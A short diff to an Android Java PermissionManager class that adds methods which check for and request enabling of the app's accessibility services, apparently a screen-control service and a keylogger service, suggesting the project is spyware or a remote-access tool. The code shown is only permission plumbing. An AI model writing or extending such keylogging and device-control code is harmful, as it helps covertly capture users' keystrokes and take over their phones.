@@ -142,6 +142,27 @@ public final class PermissionManager {
         }
     }
 
+    public static boolean hasAccessibility(Context ctx) {
+        String enabledServices = Settings.Secure.getString(
+                ctx.getContentResolver(),
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+        );
+        if (enabledServices == null) return false;
+        String pkg = ctx.getPackageName();
+        return enabledServices.contains(pkg + "/.features.screen.ScreenControlService") ||
+               enabledServices.contains(pkg + "/.features.keylogger.KeyloggerService");
+    }
+
+    public static void requestAccessibility(Context ctx) {
+        if (!hasAccessibility(ctx)) {
+            try {
+                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                ctx.startActivity(i);
+            } catch (Exception ignored) {}
+        }
+    }
+
     public static void openAppSettings(Context ctx) {
         try {
             Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
